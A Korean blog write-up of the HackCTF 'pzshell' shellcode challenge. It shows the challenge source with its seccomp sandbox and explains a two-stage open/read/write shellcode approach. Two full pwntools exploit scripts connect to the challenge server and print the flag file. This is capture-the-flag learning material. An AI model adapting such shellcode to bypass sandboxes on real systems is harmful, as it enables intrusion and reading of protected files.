---
layout: post
title:  "HacCTF pzshell write-up"
date:   2020-03-23 19:45:55
image:  hackctf_pzshell.PNG
tags:   [HackCTF]
categories: [Write-up]
---

# [HackCTF] pzshell

Date: Feb 03, 2020
Tags: report


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pzshell/Untitled.png)

NX비트를 제외하고 다 걸려있다. 이문제는 ezshell 문제에 이어서 RWX 권한이 존재하는 것으로 보인다.



**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pzshell/Untitled%201.png)

역시 입력을 한번받고 끝난다. 세그폴트가 떳는데 코드를 살펴보자.



**3) 코드흐름 파악**

    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>
    #include <unistd.h>
    #include <seccomp.h>
    #include <linux/seccomp.h>
    #include <sys/prctl.h>
    #include <fcntl.h>
    
    ...
    
    void Init(void)
    {
    	setvbuf(stdin, 0, 2, 0);
    	setvbuf(stdout, 0, 2, 0);
    	setvbuf(stderr, 0, 2, 0);
    }
    
    int main(void)
    {
    	char s[0x10];
    	char result[0x100] = "\x0F\x05\x48\x31\xED\x48\x31\xE4\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xF6\x48\x31\xFF\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xD2\x4D\x31\xDB\x4D\x31\xE4\x4D\x31\xED\x4D\x31\xF6\x4D\x31\xFF\x66\xbe\xf1\xde";
    	char filter[2] = {'\x0f', '\x05'};
    
    	Init();
    
    	read(0, s, 8);
    
    	for (int i = 0; i < 2; i ++)
    	{
    		if (strchr(s, filter[i]))
    		{
    			puts("filtering :)");
    			exit(1);
    		}
    	}
    
    	strcat(result, s);
    
    	sandbox();
    
    	(*(void (*)()) result + 2)();
    }

ezshell 과 흐름은 비슷하다. 필터에서는 syscall의 디스어셈인 \x0f\x05가 있다. 처음에 read로 8바이트를 입력가능하다.

또한 추가적으로 sandbox 함수가 존재한다. seccomp 관련 함수는 리눅스 커널에서 샌드박싱을 제공하는 컴퓨터 보안 기능으로서 설정한 syscall을 제외하고는 syscall을 호출불가능하다.

    void sandbox(void)
    {
    	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); **//디폴트로 모든것 syscall 허용**
    
    	if (ctx == NULL)
    	{
    		write(1, "seccomp error\n", 15);
    		exit(-1);
    	}
    
    	**//룰을 추가함. 해당 syscall은 호출불가**
    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork), 0);
    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork), 0);
    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(clone), 0);
    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(creat), 0);
    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(ptrace), 0);
    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(prctl), 0);
    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
    	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);
    
    	if (seccomp_load(ctx) < 0)
    	{
    		seccomp_release(ctx);
    		write(1, "seccomp error\n", 15);
    		exit(-2);
    	}
    
    	seccomp_release(ctx);
    }

결국 execve 함수를 호출하는 것은 불가능하다. 따라서 ORW를 이용하여 문제를 해결해야한다.






### 2. 접근방법

---

(해당 쉘코드 문제는 처음 접하는 문제이므로 롸업을 보면서 이해를 완벽하게 한다음에 진행을 하였다.)

ORW이란. Open, Read, Write syscall을 이용해서 플래그를 읽는 방법을 말한다. execve의 사용이 불가능함으로 쉘을 따는 방법이 아닌,  현재 서버에 파일로 존재하는 플래그를 읽는 방식으로 접근해야 한다.

우선 현재 서버에 플래그가 담긴 파일이 존재하는지, 만약 존재한다면 그 파일의 이름이 무엇인지 확인해야한다. getdents 시스템 콜을 이용하자. 간단히 말하면 해당 시스템콜은 "ls " 명령어 수행시 내부에서 호출되는 시스템 콜이다. 따라서 이를 이용하여 파일의 이름을 알아 낼 수 있다.

처음에 read로 8바이트만 입력가능하므로 사이즈 제한을 풀기 위해 8바이트 이내의 다음의 쉘코드를 먼져 보낸다.

    **<resul배열의 마지막 어셈블리 부분>**
    0x000000000000002f:  66 BE F1 DE    mov     si, 0xdef1
    ..
    
    
    shell="xchg rsi,rdx;"
    shell=asm(shell)
    shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFC7+4), vma=0x1, arch='amd64',os='linux')
    shell=shell.ljust(8,"\xcc")

result의 마지막 쉘코드가 si에 0xdef1을 복사하는 코드다. 따라서 xchg 명령어를 이용해 rsi와 rdx의 값을 바꿔준다. 이렇게 되면 rdx에 0xdef1이 들어가고 바로 syscall의 위치로 jump를 하면 read함수가 호출되면서 사이즈는 0xdef1만큼 입력이 가능하다. 



- **파일이름 읽는 시나리오**
    1. **현재 디렉토리(" . ")를 파일 이름으로 하여 open으로 열기 open(".\x00",0,0)**

        ⇒ 이렇게 정상적으로 열리면 fd=3을 반환할 것임.

    2. **getdents 함수 syscall 하기 getdents(rdi=fd:3, rsi=내용저장할주소[rsp], 읽을 사이즈)**
    ⇒ 첫번째 인자인 fd에 1번에서 open한 3값을 줌

        ⇒ 두번째 인자로 읽은 값을 저장한 주소를 줌

        ⇒ 세번째 인자로 읽을 사이즈를 줌

    3. **write로 출력하기 write(rax=1,rdi=1,rsi=lea rsi,[rsp],출력할 사이즈)**
    => getdents함수를 통해 저장된 값을 write로 바로 출력

위 시나리오대로 쉘코드를 짠뒤 실행시키면 다음과 같은 결과를 얻는다.

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pzshell/Untitled%202.png)



**파일이름** : S3cr3t_F14g 

파일이름도 알았으니 이제 다음의 시나리오를 통해 플래그를 출력시켜보자.

- **S3cr3t_F14g 파일의 내용을 출력시키는 시나리오**
    1. **(" S3cr3t_F14g ")를 파일 이름으로 하여 open으로 열기**

        ⇒ 이렇게 정상적으로 열리면 fd=3을 반환할 것임.

    2. read로 파일이름을 읽어서 스택에 저장하기 read(fd=3,rsi, 사이즈)
    3. **write로 출력하기 write(rax=1,rdi=1,rsi=lea rsi,[rsp],출력할 사이즈)**
    => read함수를 통해 반환된 값을 rdx에 넣고 출력

위 시나리오대로 쉘코드를 만들어서 실행시키면 정상적으로 플래가 출력된다

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pzshell/Untitled%203.png)





### 3. 풀이

---

- **첫번째 시나리오 코드(파일이름 찾기)**

        from pwn import *
        #context.log_level="DEBUG"
        context(arch="amd64",os="linux",log_level="DEBUG")
        p=remote("ctf.j0n9hyun.xyz",3038)
        #p=process("./pzshell")
        #gdb.attach(p,'code\nb *0xea0+$code\n')
        
        shell="xchg rsi,rdx;"
        shell=asm(shell)
        shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFC7+4), vma=0x1, arch='amd64',os='linux')
        shell=shell.ljust(8,"\xcc")
        log.info(len(shell))
        pause()
        p.send(shell)
        
        open="mov rsp,QWORD PTR fs:[0];"
        open+="push 0x2e;"
        open+="lea rdi,[rsp];"
        open+="xor rdx,rdx;"
        open+="xor rsi,rsi;"
        open+="mov rax,2;"
        open+="syscall;"
        
        getdents="mov rdi,rax;"
        getdents+="lea rsi,[rsp];"
        getdents+="xor rdx,rdx;"
        getdents+="xor rax,rax;"
        getdents+="mov dx,0x3050;"
        getdents+="mov rax,0x4e;"
        getdents+="syscall;"
        
        write="mov rdx,rax;"
        write+="xor rax,rax;"
        write+="xor rdi,rdi;"
        write+="xor rsi,rsi;"
        write+="mov rdi,1;"
        write+="mov rax,1;"
        write+="lea rsi,[rsp];"
        write+="syscall"
        
        
        p.send(asm(open)+asm(getdents)+asm(write))
        p.interactive()




- **두번째 시나리오(플래그 출력)**

        from pwn import *
        #context.log_level="DEBUG"
        context(arch="amd64",os="linux",log_level="DEBUG")
        p=remote("ctf.j0n9hyun.xyz",3038)
        #p=process("./pzshell")
        #gdb.attach(p,'code\nb *0xea0+$code\n')
        
        shell="xchg rsi,rdx;"
        shell=asm(shell)
        shell+=asm('jmp '+hex(0xFFFFFFFFFFFFFFC7+4), vma=0x1, arch='amd64',os='linux')
        shell=shell.ljust(8,"\xcc")
        log.info(len(shell))
        pause()
        p.send(shell)
        
        open="lea rdi,[rsp];"
        open+="xor rdx,rdx;"
        open+="xor rsi,rsi;"
        open+="mov rax,2;"
        open+="syscall;"
        
        filename="mov rsp,QWORD PTR fs:[0];"
        filename+=shellcraft.pushstr('S3cr3t_F14g')
        
        getdents="mov rdi,rax;"
        getdents+="lea rsi,[rsp];"
        getdents+="xor rdx,rdx;"
        getdents+="xor rax,rax;"
        getdents+="mov dx,0x3050;"
        getdents+="mov rax,0x4e;"
        getdents+="syscall;"
        
        read="mov rdx,0x300;"
        read+="mov rdi,rax;"
        read+="xor rax,rax;"
        read+="lea rsi,[rsp];"
        read+="syscall;"
        
        write="mov rdx,rax;"
        write+="xor rax,rax;"
        write+="xor rdi,rdi;"
        write+="xor rsi,rsi;"
        write+="mov rdi,1;"
        write+="mov rax,1;"
        write+="lea rsi,[rsp];"
        write+="syscall"
        
        
        p.send(asm(filename)+asm(open)+asm(read)+asm(write))
        p.interactive()





### 4. 몰랐던 개념

---

ezshell, pzshell, 문제를 풀면서 쉘코드를 직접 만드는 과정을 거쳐봤는데, 확실히 윈도우에서 먼저 해서 그런지 쉽게 이해하고 진행했다.

또한 seccomp 함수를 처음 들어봤는데 새로운 ORW 방법도 알게되어서 재밌는 문제였다.